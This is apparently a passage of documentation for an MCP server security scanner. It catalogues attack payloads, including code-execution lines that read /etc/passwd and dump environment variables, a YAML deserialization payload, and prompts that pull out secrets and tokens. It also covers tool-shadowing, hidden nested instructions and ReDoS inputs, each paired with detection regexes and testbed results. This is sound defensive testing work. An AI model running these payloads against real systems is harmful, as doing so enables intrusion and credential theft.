| 13.2 | `\u0069\u0067\u006e\u006f\u0072\u0065` (ignore) | `/(decoded\|unicode\|ignore.*previous\|executed)/i`            | Unicode-encoded instruction    |

#### Expected Vulnerable Response

```json
{
  "result": "Unicode decoded and executed: root"
}
```

#### Expected Safe Response

```json
{
  "result": "Text received: \\u0077\\u0068\\u006f\\u0061\\u006d\\u0069",
  "safe": true
}
```

#### Testbed Validation

- `vulnerable_unicode_processor_tool`: 1 detection (decodes and executes)
- `safe_storage_tool_mcp`: 0 detections (stores unicode as-is)

---

### 15. Nested Injection

**Attack Vector**: Tests if tools execute hidden instructions in nested JSON.

**Risk Level**: MEDIUM (1), HIGH (1)
**Payload Count**: 2

#### Payloads

| ID   | Payload                                      | Evidence Pattern                                                | Description                          | Risk   |
| ---- | -------------------------------------------- | --------------------------------------------------------------- | ------------------------------------ | ------ |
| 14.1 | `{"query":"normal","hidden":"whoami"}`       | `/(executed.*hidden\|nested.*instruction\|root\|user\|admin)/i` | Hidden command in JSON field         | MEDIUM |
| 14.2 | `{"visible":"safe","_execute":"delete all"}` | `/(executed\|deleted\|internal.*field\|hidden)/i`               | Hidden instruction in internal field | HIGH   |

#### Expected Vulnerable Response

```json
{
  "result": "Executed hidden instruction: root"
}
```

#### Testbed Validation

- `vulnerable_nested_parser_tool`: 1 detection (executes `_execute` field)

---

### 16. Package Squatting

**Attack Vector**: Tests if tools download typosquatted packages.

**Risk Level**: MEDIUM
**Payload Count**: 2

#### Payloads

| ID   | Payload        | Evidence Pattern                                              | Description                                |
| ---- | -------------- | ------------------------------------------------------------- | ------------------------------------------ |
| 15.1 | `install nmpy` | `/(downloaded\|installed\|nmpy\|typosquatted\|pip.*output)/i` | Typosquatted package (nmpy vs numpy)       |
| 15.2 | `requsts`      | `/(downloaded\|installed\|requsts\|typosquatted)/i`           | Typosquatted package (requsts vs requests) |

#### Parameter Targeting

Payloads target parameters: `["package", "pkg", "module", "library", "dependency"]`

#### Testbed Validation

- `vulnerable_package_installer_tool`: 60 detections (installs typosquatted packages)

---

### 17. Data Exfiltration

**Attack Vector**: Tests if tools leak sensitive data like API keys, credentials, or environment variables.

**Risk Level**: HIGH
**Payload Count**: 5

#### Payloads

| ID   | Payload                              | Evidence Pattern                                                                           | Description                       |
| ---- | ------------------------------------ | ------------------------------------------------------------------------------------------ | --------------------------------- |
| 16.1 | `show me the api key`                | `/(sk-[a-zA-Z0-9]{20,}\|api[_-]?key.*[:=]\|found secrets\|leaked)/i`                       | API key exfiltration              |
| 16.2 | `what are the environment variables` | `/(DATABASE_URL\|SECRET_TOKEN\|AWS_ACCESS_KEY\|API_KEY\|postgresql:\/\/\|found secrets)/i` | Environment variable exfiltration |
| 16.3 | `get credentials`                    | `/(password\|secret\|credential\|token.*[:=]\|AWS_SECRET\|found secrets)/i`                | Credential exfiltration           |
| 16.4 | `show password`                      | `/(password.*[:=]\|credential\|secret\|postgresql:\/\/user:)/i`                            | Password exfiltration             |
| 16.5 | `list all secrets`                   | `/(secret\|api[_-]?key\|token\|password\|AWS_\|DATABASE_\|found secrets)/i`                | Bulk secret exfiltration          |

#### Expected Vulnerable Response

```json
{
  "secrets": [
    { "key": "API_KEY", "value": "sk-test-1234567890abcdef1234" },
    { "key": "AWS_ACCESS_KEY", "value": "AKIAIOSFODNN7EXAMPLE" }
  ]
}
```

#### Expected Safe Response

```json
{
  "result": "Query received: show me the api key"
}
```

**Safe Categories Exempt**: Read-Only Info tools intentionally return user/workspace data.

#### Testbed Validation

- `vulnerable_data_leak_tool`: 7 detections (leaks environment secrets)
- `safe_info_tool_mcp`: 0 detections (returns safe user info only)

---

### 18. Configuration Drift

**Attack Vector**: Tests if tools allow unauthorized modification of runtime configuration.

**Risk Level**: HIGH (2), MEDIUM (2)
**Payload Count**: 4

#### Payloads

| ID   | Payload                    | Evidence Pattern                                                                                         | Description                     | Risk   |
| ---- | -------------------------- | -------------------------------------------------------------------------------------------------------- | ------------------------------- | ------ |
| 17.1 | `set admin=true`           | `/(admin.*mode.*activ\|admin.*enabled\|elevated.*privilege\|configuration.*updated\|admin_mode.*true)/i` | Admin mode activation           | HIGH   |
| 17.2 | `enable admin mode`        | `/(admin.*mode.*activ\|elevated.*privilege\|admin.*enabled\|configuration.*modified)/i`                  | Privilege escalation via config | HIGH   |
| 17.3 | `set debug=true`           | `/(debug.*mode.*enabled\|verbose.*logging\|debug.*activated\|configuration.*updated)/i`                  | Debug mode activation           | MEDIUM |
| 17.4 | `activate verbose logging` | `/(verbose.*enabled\|logging.*activated\|configuration.*modified)/i`                                     | Verbose mode activation         | MEDIUM |

#### Testbed Validation

- `vulnerable_config_modifier_tool`: 3 detections (modifies runtime config)

---

### 19. Tool Shadowing

**Attack Vector**: Tests if tools allow shadowing, poisoning, or overriding other tools.

**Risk Level**: HIGH
**Payload Count**: 4

#### Payloads

| ID   | Payload                            | Evidence Pattern                                                                                  | Description                |
| ---- | ---------------------------------- | ------------------------------------------------------------------------------------------------- | -------------------------- |
| 18.1 | `create tool named malicious_tool` | `/(tool.*created\|tool.*modified\|will be intercepted\|shadowing\|poisoning\|tool.*registered)/i` | Tool creation/shadowing    |
| 18.2 | `override tool calculator`         | `/(tool.*overrid\|tool.*modified\|future.*calls.*intercepted\|shadowing\|poisoning)/i`            | Tool override attempt      |
| 18.3 | `shadow the original function`     | `/(shadow\|tool.*modified\|intercepted\|poisoning\|function.*replaced)/i`                         | Function shadowing         |
| 18.4 | `redefine tool behavior`           | `/(redefin\|tool.*modified\|behavior.*changed\|tool.*created\|intercepted)/i`                     | Tool behavior redefinition |

#### Testbed Validation

- `vulnerable_tool_override_tool`: 4 detections (allows tool poisoning)

---

## Resource Exhaustion Patterns

### 20. DoS/Resource Exhaustion

**Attack Vector**: Tests if tools are vulnerable to denial of service through resource exhaustion (ReDoS, memory allocation, timeout abuse).

**Risk Level**: HIGH (9), MEDIUM (3)
**Payload Count**: 12

#### Payload Categories

**1. ReDoS Payloads (4)** - Catastrophic Backtracking:

- `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!` - Evil regex input
- `(a+)+b` - Nested quantifier pattern
- `a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]` - Character class abuse
- `^(([a-z])+.)+[A-Z]([a-z])+$` - Polynomial complexity pattern

**2. Memory Allocation (3)**:

- `999999999999` - Large number input
- `"x".repeat(10000)` - 10KB string payload
- `{"a":{"a":...}}` (10 levels deep) - Deep JSON nesting

**3. Timeout Abuse (3)**:

- `sleep(99999)` - Sleep command injection
- `WAITFOR DELAY '00:10:00'` - SQL WAITFOR
- `[[[[...]]]]` (20 levels) - Nested arrays

**4. Expansion Attacks (2)**:

- `UEsDBBQAAAAIAAAAAACJBAAAAAAAAQAAAAEAAABhYQAAUEsBAhQAFAAAAAgA` - Zip bomb indicator
- `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol...` - XML Billion Laughs

#### Expected Vulnerable Response

```json
{
  "error": "Timeout: catastrophic backtracking detected after 5000ms"
}
```

#### Expected Safe Response

```json
{
  "error": {
    "code": -32602,
    "message": "Payload rejected: exceeds maximum size limit"
  }
}
```

**Safe Indicators**:

- Resource limits enforced
- Payload size rejection
- Timeout protection enabled

#### Detection Logic

```typescript
// Check for safe rejection patterns
if (/payload.*rejected|size.*limit|resource.*limit/.test(response)) {
  return { safe: true, evidence: "Resource limit enforced" };
}

// Check for timeout/ReDoS evidence
if (/timeout|catastrophic|backtrack/.test(response)) {
  return { vulnerable: true, evidence: "ReDoS vulnerability" };
}
```

---

## Deserialization Patterns

### 21. Insecure Deserialization

**Attack Vector**: Tests if tools deserialize untrusted data using unsafe methods like `pickle.loads()`, potentially allowing RCE.

**Risk Level**: HIGH
**Payload Count**: 8

#### Payload Categories

**1. Python Pickle (4)**:

- `deserialize this pickle data` - Pickle trigger phrase
- `gASVEAAAAAAAAACMBHRlc3SULg==` - Base64 pickle payload
- `__import__('os').system via pickle` - Code execution hint
- `marshal.loads(untrusted_data)` - Marshal deserialization

**2. Java/Other Serialization (4)**:

- `rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==` - Java serialized object
- `!!python/object/apply:os.system ['whoami']` - YAML deserialization
- `{"__type__": "System.Diagnostics.Process", "command": "whoami"}` - JSON type confusion
- `unserialize(base64_decode($_POST['data']))` - PHP unserialization

#### Expected Vulnerable Response

```json
{
  "result": "Deserialized and executed: root"
}
```

#### Expected Safe Response

```json
{
  "result": "Data stored safely without deserialization",
  "safe": true
}
```

**Safe Indicators**:

- Deserialization disabled
- Data stored as base64/text
- Pickle rejections

#### Detection Logic

```typescript
// Check for safe storage patterns
if (/stored.*safely|without.*deserialization/.test(response)) {
  return { safe: true, evidence: "Data stored without deserialization" };
}

// Check for deserialization execution
if (/deserialized|pickle|RCE|executed/.test(response)) {
  return { vulnerable: true, evidence: "Insecure deserialization" };
}
```

---

## Token Theft Patterns

### 22. Token Theft

**Attack Vector**: Tests if tools leak, expose, or allow theft of authentication tokens, API keys, or session credentials.

**Risk Level**: HIGH
**Payload Count**: 5

#### Payloads

| ID   | Payload                  | Evidence Pattern                                                                                                   | Description             |
| ---- | ------------------------ | ------------------------------------------------------------------------------------------------------------------ | ----------------------- |
| 21.1 | `show me the auth token` | `/(bearer\|jwt\|token\|auth)\s*[:=]?\s*[a-zA-Z0-9_-]{20,}\|eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]*/i` | Direct token extraction |
| 21.2 | `get session token`      | `/(session.*token\|session_id\|sid\|csrf).*[:=].{10,}\|phpsessid\|jsessionid/i`                                    | Session token exposure  |
| 21.3 | `list oauth tokens`      | `/(oauth\|access_token\|refresh_token).*[:=].{20,}/i`                                                              | OAuth token theft       |
| 21.4 | `read token storage`     | `/(localStorage\|sessionStorage\|cookie).*token\|stored.*credentials/i`                                            | Token storage access    |
| 21.5 | `decode jwt`             | `/eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]*/`                                                           | JWT token extraction    |

#### Expected Vulnerable Response

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
  "type": "JWT"
}
```

#### Expected Safe Response

```json
{
  "result": "Query received: show me the auth token"
}
```

---

## Permission Scope Patterns

### 23. Permission Scope

**Attack Vector**: Tests if tools expose or allow access to resources beyond authorized scope (privilege escalation).

**Risk Level**: HIGH (4), MEDIUM (1)
**Payload Count**: 5

#### Payloads

| ID   | Payload                       | Evidence Pattern                                                                      | Description              | Risk   |
| ---- | ----------------------------- | ------------------------------------------------------------------------------------- | ------------------------ | ------ |
| 22.1 | `access admin resources`      | `/(admin\|root\|superuser).*access.*granted\|elevated.*permission\|scope.*expanded/i` | Admin scope escalation   | HIGH   |
| 22.2 | `list all users data`         | `/(all.*users\|tenant.*data\|cross.*org\|other.*account).*returned/i`                 | Cross-tenant data access | HIGH   |
| 22.3 | `enumerate permissions`       | `/(permission\|scope\|capability).*list.*returned\|all.*access.*levels/i`             | Permission enumeration   | MEDIUM |
| 22.4 | `bypass permission check`     | `/(permission.*bypass\|access.*granted\|authorization.*skip)/i`                       | Permission check bypass  | HIGH   |
| 22.5 | `{"scope": "*", "all": true}` | `/(wildcard.*scope\|all.*resources\|unlimited.*access)/i`                             | Wildcard scope injection | HIGH   |

---

## Code Execution Patterns

### 24. Code Execution (Language-Aware)

**Attack Vector**: Tests if tools execute arbitrary code in various languages (Python, JavaScript, SQL).

**Risk Level**: HIGH
**Payload Count**: 8

#### Payload Categories

**1. Python Payloads (5)**:

- `import subprocess; print(subprocess.check_output(['whoami']).decode())` - subprocess execution
- `__import__('os').system('whoami')` - os.system via **import**
- `import os; print(os.popen('whoami').read())` - os.popen execution
- `print(open('/etc/passwd').read())` - File read
- `import os; print(os.environ)` - Environment dump

**2. JavaScript Payloads (3)**:

- `require('child_process').execSync('whoami').toString()` - execSync execution
- `require('fs').readFileSync('/etc/passwd', 'utf8')` - File read
- `JSON.stringify(process.env)` - Environment dump

#### Parameter Targeting

Payloads target parameters: `["code", "script", "python", "javascript", "js", "source", "program", "expression"]`

#### Expected Vulnerable Response

```json
{
  "output": "root\n",
  "executed": true
}
```

#### Detection Logic

```typescript
// Detect language from parameter name/description
const language = detectLanguage(paramName, toolName, toolDescription);

// Use language-appropriate payloads
if (language === "python") {
  payload = "import subprocess; ...";
} else if (language === "javascript") {
  payload = "require('child_process')...";
}

// Check for execution evidence
if (/\b(root|user|admin)\b/.test(response)) {
  return { vulnerable: true, evidence: "Code execution detected" };
}
```

---

## Session Management Patterns

### 25. Session Management

**Attack Vector**: Tests if tools handle session tokens securely. Detects session fixation, predictable tokens, missing timeouts, and ID exposure in URLs (Issue #111: Challenge #12).

**Risk Level**: HIGH
**Payload Count**: 6
**CWEs Detected**: CWE-384, CWE-330, CWE-613, CWE-200

#### Payloads

| ID   | Payload                                            | Evidence Pattern                                                    | CWE     | Description                                          |
| ---- | -------------------------------------------------- | ------------------------------------------------------------------- | ------- | ---------------------------------------------------- |
| 24.1 | `{"session_id": "external123"}`                    | `/session_fixed\|external.*accepted\|external.*session/i`           | CWE-384 | Session Fixation - accepts external session ID       |
| 24.2 | `{"session_regenerated": false}`                   | `/no.*regenerat\|session.*not.*regenerat\|regenerat.*false/i`       | CWE-384 | No Session Regeneration - session unchanged          |
| 24.3 | `{"session_id": "session_user_timestamp_counter"}` | `/session_user_.*_.*_.*\|predictable.*token\|sequential.*session/i` | CWE-330 | Predictable Token - pattern-based session generation |
| 24.4 | `{"expires_at": null, "timeout_checked": false}`   | `/no.*timeout\|expires.*null\|never.*expire\|permanent.*session/i`  | CWE-613 | No Session Timeout - indefinite session validity     |
| 24.5 | `?session_id=abc123def456` (URL parameter)         | `/session_id.*url\|session.*exposed.*url\|id.*visible.*url/i`       | CWE-200 | ID Exposure in URL - session ID in query string      |
| 24.6 | `{"session": "weak_token_123"}`                    | `/weak.*token\|123.*session\|simple.*token\|non.*random/i`          | CWE-330 | Weak Token Generation - non-random or simple tokens  |

#### Target Parameters

Payloads target parameters: `["session", "session_id", "token", "auth_token", "jwt", "cookie", "user_session", "access_token"]`

#### Expected Vulnerable Responses

**Session Fixation Vulnerability**:

```json
{
  "session_fixed": true,
  "session_id": "external123"
}
```

**No Regeneration Vulnerability**:

```json
{
  "session_regenerated": false,
  "current_session_id": "old_id_123"
}
```

#### Detection Logic

```typescript
// Test 1: Session Fixation
if (response.session_fixed || response.session_id === "external123") {
  vulnerabilities.push({
    type: "sessionFixation",
    cwe: "CWE-384",
    severity: "HIGH",
  });
}

// Test 2: No Regeneration
if (!response.session_regenerated) {
  vulnerabilities.push({
    type: "noSessionRegeneration",
    cwe: "CWE-384",
    severity: "HIGH",
  });
}

// Test 3: Predictable Tokens
if (/session_\w+_\d+_\d+/.test(sessionId)) {
  vulnerabilities.push({
    type: "predictableToken",
    cwe: "CWE-330",
    severity: "HIGH",
  });
}

// Test 4: No Timeout
if (expiresAt === null || !timeoutChecked) {
  vulnerabilities.push({
    type: "noSessionTimeout",
    cwe: "CWE-613",
    severity: "HIGH",
  });
}

// Test 5: ID Exposure in URL
if (url.includes("session_id=")) {
  vulnerabilities.push({
    type: "sessionIdInUrl",
    cwe: "CWE-200",
    severity: "HIGH",
  });
}
```

---

## Additional Security Patterns

### 26. Tool Output Injection (Issue #103, Challenge #8)

**Description**: Tests if tool responses can be manipulated to inject content into other tools.

**Status**: Referenced in codebase, pattern framework in place

### 27. Secret Leakage (Issue #103, Challenge #9)

**Description**: Tests if tools leak secrets through responses or error messages.

**Status**: Referenced in codebase, pattern framework in place

### 28. Blacklist Bypass (Issue #103, Challenge #11)

**Description**: Tests if input validation blacklists can be bypassed.

**Status**: Referenced in codebase, pattern framework in place

### 29. Auth Bypass (Issue #75)

**Description**: Tests for fail-open authentication vulnerabilities where tools respond successfully without proper authorization.

**Status**: Referenced in codebase, pattern framework in place

### 30. Cross-Tool State Bypass (Issue #92)

**Description**: Tests for cross-tool privilege escalation via shared state management.

**Status**: Referenced in codebase, pattern framework in place

### 31. Chained Exploitation (Issue #93)

**Description**: Tests for multi-tool attack chains where output of one tool feeds into vulnerability in another.

**Status**: Referenced in codebase, pattern framework in place

---

## Detection Architecture

The inspector uses a **4-layer defense-in-depth detection strategy** to eliminate false positives:

### Layer 1: MCP Validation Errors (Highest Priority)

Tools that reject invalid input before processing are **SECURE**.

```typescript
if (errorCode === -32602) {
  return { safe: true, evidence: "MCP validation error" };
}
```

**Why this matters**: Proper input validation is the first line of defense. Tools that reject malicious input at the protocol level never execute it.

### Layer 1.5: Tool Category Classification

Distinguishes safe tool categories before pattern matching:

```typescript
const category = classifier.classify(toolName, toolDescription);

if (
  category === ToolCategory.SEARCH_RETRIEVAL &&
  isSearchResultResponse(response)
) {
  return { safe: true, evidence: "Search tool returned query results" };
}

if (category === ToolCategory.READ_ONLY_INFO) {
  return {
    safe: true,
    evidence: "Read-only info tool (intended data exposure)",
  };
}

if (category === ToolCategory.SAFE_STORAGE) {
  return { safe: true, evidence: "Safe storage control tool (validated safe)" };
}
```

**Safe Categories**:

- **Search/Retrieval**: Return query results, not execute code
- **CRUD Creation**: Create/modify resources, not execute code
- **Read-Only Info**: Return user/workspace data (intended exposure)
- **Safe Storage**: Validated safe implementations (testbed control group)

### Layer 2: Reflection Detection

Identifies when tools safely echo/store malicious input:

```typescript
// Bidirectional patterns catch both "stored query" and "query stored"
if (/stored.*query|query.*stored|received.*and/.test(response)) {
  // Verify NO execution evidence (defense-in-depth)
  if (!detectExecutionArtifacts(response)) {
    return { safe: true, evidence: "Safe reflection" };
  }
}
```

**Reflection Patterns** (72 patterns total):

- Status messages: `action executed successfully:`, `action received:`
- Storage confirmations: `stored successfully`, `query stored`, `data stored`
- Safety indicators: `stored safely`, `without execution`, `treated as data`
- DoS rejection: `payload rejected`, `input exceeds limit`, `rate limit`
- Deserialization rejection: `pickle disabled`, `stored without deserializ`

### Layer 3: Execution Evidence

Detects actual code execution (not safe reflection):

```typescript
// HIGH CONFIDENCE - System files
if (/[a-z]+:x:\d+:\d+:/.test(response)) {
  // passwd format
  return { vulnerable: true, evidence: "File accessed" };
}

// HIGH CONFIDENCE - Directory listings
if (/[d-][rwx-]{9}\s+\d+\s+[a-z]+/.test(response)) {
  // ls -la format
  return { vulnerable: true, evidence: "Command executed" };
}

// MEDIUM CONFIDENCE - Contextual patterns
if (/\/etc\/passwd/.test(response) && !containsEchoedPayload(response)) {
  return { vulnerable: true, evidence: "File path execution" };
}
```

**Execution Indicators**:

- System files: `root:x:0:0:`, `uid=0(root) gid=0(root)`
- Directory listings: `drwxr-xr-x 2 root`, `total 42`
- Command fields: `command_executed:`, `stdout:`
- Process info: `PID: 1234`

### Layer 3.5: Execution Context Classification (Issue #146)

Distinguishes between actual code execution and payload reflection in error messages to reduce false positives:

```typescript
// Classify whether payload appears in error context or success context
const context = classifyVulnerabilityContext(response, payload, toolName);

if (context.executionContext === "LIKELY_FALSE_POSITIVE") {
  // Payload echoed in error message (safe reflection)
  return {
    safe: true,
    evidence: context.contextEvidence,
    executionContext: "LIKELY_FALSE_POSITIVE",
  };
}
```

**Context Classification Logic**:

1. **Extract Context Keywords**: Scan response for error/success indicators

   ```typescript
   // ERROR_CONTEXT_PATTERNS (61 patterns)
   const errorKeywords = [
     "invalid",
     "error",
     "failed",
     "rejected",
     "blocked",
     "not allowed",
     "denied",
     "validation failed",
     "unauthorized",
   ];

   // SUCCESS_CONTEXT_PATTERNS (72 patterns)
   const successKeywords = [
     "executed successfully",
     "command ran",
     "result is",
     "operation completed",
     "query returned",
     "found",
   ];
   ```

2. **Classify Context**: Determine if payload appears in error or success context
   - `hasErrorContext()`: Checks for error keywords surrounding payload
   - `hasSuccessContext()`: Checks for success keywords near payload
   - `isPayloadInErrorContext()`: Combines both checks with confidence scoring

3. **Determine Execution Context**:

   ```typescript
   if (isPayloadInErrorContext(response, payload)) {
     return {
       executionContext: "LIKELY_FALSE_POSITIVE",
       contextEvidence: "Payload echoed in error message",
       operationSucceeded: false,
     };
   }

   if (hasSuccessContext(response)) {
     return {
       executionContext: "CONFIRMED",
       contextEvidence: "Success indicators present",
       operationSucceeded: true,
     };
   }

   return {
     executionContext: "SUSPECTED",
     contextEvidence: "Ambiguous context",
     operationSucceeded: undefined,
   };
   ```

**New SecurityTestResult Fields**:

- `executionContext`: `"CONFIRMED"` | `"LIKELY_FALSE_POSITIVE"` | `"SUSPECTED"`
- `contextEvidence`: Human-readable explanation of classification
- `operationSucceeded`: Boolean indicating operation success/failure

**Example: Error Reflection (Safe)**:

```json
{
  "error": "Invalid input: 'whoami' is not recognized as a valid command"
}
// executionContext: "LIKELY_FALSE_POSITIVE"
// contextEvidence: "Payload echoed in error message (invalid, not recognized)"
// operationSucceeded: false
```

**Example: Execution (Vulnerable)**:

```json
{
  "result": "Command executed successfully: root"
}
// executionContext: "CONFIRMED"
// contextEvidence: "Success indicators present (executed successfully)"
// operationSucceeded: true
```

**Pattern Library Updates**:

- `ERROR_CONTEXT_PATTERNS`: 61 error indicators (e.g., "invalid", "rejected", "validation failed")
- `SUCCESS_CONTEXT_PATTERNS`: 72 success indicators (e.g., "executed successfully", "operation completed")
- Helper functions: `isPayloadInErrorContext()`, `hasSuccessContext()`, `hasErrorContext()`
- Context classifier: `classifyVulnerabilityContext()` in SecurityResponseAnalyzer

### Layer 4: Fallback Analysis

Comprehensive pattern matching for edge cases:

```typescript
if (/executed|command.*ran|result.*is/.test(response)) {
  // Double-check: not just reflection
  if (!isReflectionResponse(response)) {
    return { vulnerable: true, evidence: "Execution keywords" };
  }
}
```

---

## Zero False Positive Design

### Problem: Structured Data Tools

Search tools naturally echo input patterns in results:

```json
{
  "results": [
    { "title": "Admin Guide", "snippet": "...admin resources..." },
    { "title": "whoami Command", "snippet": "The whoami command returns..." }
  ]
}
```

**Without category classification**, this would trigger false positives on "admin" and "whoami" patterns.

### Solution: Category-Aware Detection

```typescript
// Step 1: Classify tool
const category = classifier.classify(toolName, toolDescription);

// Step 2: Check for expected response format
if (category === ToolCategory.SEARCH_RETRIEVAL) {
  if (isSearchResultResponse(response)) {
    return { safe: true, evidence: "Search results (not execution)" };
  }
}
```

### Confidence Scoring

Ambiguous detections require manual review:

```typescript
if (
  isStructuredDataTool(toolName, toolDescription) &&
  hasStructuredData(response) &&
  patternMatchesInput(payload, response)
) {
  return {
    confidence: "low",
    requiresManualReview: true,
    manualReviewReason: "Pattern matched in structured data response",
    reviewGuidance:
      "Verify: 1) Does tool execute input? 2) Or return data containing pattern?",
  };
}
```

**Confidence Levels**:

- **HIGH**: Clear safe/vulnerable indicators (no review needed)
- **MEDIUM**: Execution evidence but some ambiguity (review recommended)
- **LOW**: Pattern match in structured data (review required)

### Testbed Proof

**Identical tool names, different implementations**:

- `vulnerable_calculator_tool` (vulnerable-mcp): 24 detections
- `vulnerable_calculator_tool` (hardened-mcp): 0 detections

**Same tool name → Different results = Pure behavior detection**

---

## Adding New Patterns

### Step 1: Define Pattern in `securityPatterns/`

> **Note**: As of v1.37.0, security patterns are modularized by attack category.
> See [Issue #163](https://github.com/triepod-ai/inspector-assessment/issues/163) for details.
> Import from `@/lib/securityPatterns` (same path, now modular internally).

```typescript
{
  attackName: "New Attack Type",
  description: "What this attack tests",
  payloads: [
    {
      payload: "attack payload",
      evidence: /pattern.*indicating.*execution/i,
      riskLevel: "HIGH",
      description: "What this payload does",
      payloadType: "injection",
      parameterTypes: ["target", "param", "names"], // Optional
    }
  ]
}
```

### Step 2: Add Detection Logic to `SecurityAssessor.ts`

If pattern requires custom logic beyond evidence matching:

```typescript
// In analyzeResponse() method
if (attackName === "New Attack Type") {
  // Custom detection logic
  if (customCondition(response)) {
    return { vulnerable: true, evidence: "Custom detection" };
  }
}
```

### Step 3: Test Against Testbed

```bash
# Test vulnerable server (should detect)
npm run assess -- --server vulnerable-mcp --config /tmp/vulnerable-mcp-config.json

# Test hardened server (should NOT detect)
npm run assess -- --server hardened-mcp --config /tmp/hardened-mcp-config.json

# Check results
cat /tmp/inspector-assessment-vulnerable-mcp.json | jq '.security.vulnerabilities | length'
cat /tmp/inspector-assessment-hardened-mcp.json | jq '.security.vulnerabilities | length'
```

### Step 4: Validate Against Safe Tools

Ensure no false positives on safe tools:

```bash
# Check safe tool results
cat /tmp/inspector-assessment-vulnerable-mcp.json | \
  jq '[.security.promptInjectionTests[] |
      select(.toolName | startswith("safe_")) |
      select(.vulnerable == true)] | length'
# Expected: 0
```

### Pattern Design Guidelines

1. **Evidence Pattern Specificity**: Use specific patterns that indicate execution, not generic keywords
   - ❌ Bad: `/error/i` (matches validation errors too)
   - ✅ Good: `/executed.*error|runtime.*error/i` (execution-specific)

2. **Parameter Targeting**: Target specific parameter names when payload is format-specific

   ```typescript
   parameterTypes: ["url", "uri", "link"]; // Only inject into URL parameters
   ```

3. **Risk Level Assignment**:
   - **HIGH**: Direct code execution, data leaks, privilege escalation
   - **MEDIUM**: Configuration changes, resource issues, potential exploits
   - **LOW**: Protocol compliance, validation testing

4. **Payload Type Classification**:
   - `injection`: Code/command injection attempts
   - `validation`: Input validation tests
   - `protocol`: MCP protocol compliance
   - `dos`: Resource exhaustion attempts

---

## Testbed Validation

### Quick Validation Commands

```bash
# A/B Comparison (200 vs 0)
cat /tmp/inspector-assessment-vulnerable-mcp.json | jq '.security.vulnerabilities | length'
# Expected: 200

cat /tmp/inspector-assessment-hardened-mcp.json | jq '.security.vulnerabilities | length'
# Expected: 0

# Zero false positives on safe tools
cat /tmp/inspector-assessment-vulnerable-mcp.json | \
  jq '[.security.promptInjectionTests[] |
      select(.toolName | startswith("safe_")) |
      select(.vulnerable == true)] | length'
# Expected: 0

# View all vulnerabilities by tool
cat /tmp/inspector-assessment-vulnerable-mcp.json | \
  jq '[.security.promptInjectionTests[] |
      select(.vulnerable == true)] |
      group_by(.toolName) |
      map({tool: .[0].toolName, count: length})'
```

### Testbed Detection Matrix

| Tool                              | Pattern Categories Detected       | Total Detections |
| --------------------------------- | --------------------------------- | ---------------- |
| vulnerable_calculator_tool        | Calculator Injection (7) + others | 24               |
| vulnerable_system_exec_tool       | Command Injection (5) + others    | 7                |
| vulnerable_data_leak_tool         | Data Exfiltration (5) + others    | 7                |
| vulnerable_fetcher_tool           | SSRF (18)                         | 13               |
| vulnerable_tool_override_tool     | Tool Shadowing (4)                | 4                |
| vulnerable_config_modifier_tool   | Configuration Drift (3)           | 3                |
| vulnerable_nested_parser_tool     | Nested Injection (1)              | 1                |
| vulnerable_unicode_processor_tool | Unicode Bypass (1)                | 1                |
| vulnerable_package_installer_tool | Package Squatting (2)             | 60               |
| vulnerable_rug_pull_tool          | Temporal Behavior                 | 80               |
| **Total**                         | **31 patterns**                   | **200**          |

### Safe Tool Validation (0 False Positives)

All safe tools tested with **100+ patterns each** (31 attack types × ~4.8 payloads average):

- ✅ safe_storage_tool_mcp: 0 vulnerabilities
- ✅ safe_search_tool_mcp: 0 vulnerabilities
- ✅ safe_list_tool_mcp: 0 vulnerabilities
- ✅ safe_info_tool_mcp: 0 vulnerabilities
- ✅ safe_echo_tool_mcp: 0 vulnerabilities
- ✅ safe_validate_tool_mcp: 0 vulnerabilities

**Total**: 480 tests across 6 safe tools with 0 false positives = **100% precision**

---

## Pattern Statistics

```javascript
{
  totalAttackTypes: 31,
  totalPayloads: 149,
  highRiskPayloads: 128,
  mediumRiskPayloads: 18,
  lowRiskPayloads: 5,
  payloadTypeBreakdown: {
    injection: 119,
    validation: 7,
    protocol: 2,
    sessionManagement: 6,
    dos: 12,
    other: 3
  },
  averagePayloadsPerAttack: 4.8
}
```

---

## References

- **SecurityAssessor Implementation**: [client/src/services/assessment/modules/SecurityAssessor.ts](../client/src/services/assessment/modules/SecurityAssessor.ts)
- **Security Patterns Library**: [client/src/lib/securityPatterns/](../client/src/lib/securityPatterns/) (modularized in v1.37.0, [Issue #163](https://github.com/triepod-ai/inspector-assessment/issues/163))
- **Tool Classifier**: [client/src/services/assessment/ToolClassifier.ts](../client/src/services/assessment/ToolClassifier.ts)
- **Testbed Validation**: [docs/mcp_vulnerability_testbed.md](mcp_vulnerability_testbed.md)
- **Assessment Catalog**: [docs/ASSESSMENT_CATALOG.md](ASSESSMENT_CATALOG.md)

---

**Document Version**: 1.0.0
**Last Updated**: 2026-01-03
**Inspector Version**: 1.22.0
